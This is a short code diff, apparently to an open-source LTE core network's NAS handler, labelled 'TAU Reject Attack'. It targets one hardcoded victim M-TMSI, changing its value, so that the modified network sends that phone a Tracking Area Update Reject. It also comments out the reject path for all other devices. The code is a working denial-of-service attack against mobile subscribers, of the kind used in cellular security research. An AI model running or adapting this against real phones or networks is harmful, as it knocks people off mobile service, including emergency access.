@@ -847,7 +847,7 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   // MODIFIED - TAU Reject Attack
   //nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
 
-  uint32_t victim_m_tmsi = 0xd825ac7b;
+  uint32_t victim_m_tmsi = 0xd02ae964;
 
   if(m_tmsi == victim_m_tmsi) {
     nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
@@ -856,15 +856,14 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
     s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
     pool->deallocate(nas_tx);
   }
- /* 
+
   else {
     nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
     nas_log->console("Sending TAU Reject with EMM Message 10\n");
-    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.10
-    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
-    pool->deallocate(nas_tx);
+    // nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.10
+    // s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
+    // pool->deallocate(nas_tx);
   }
-  */
 
   return true;
 }
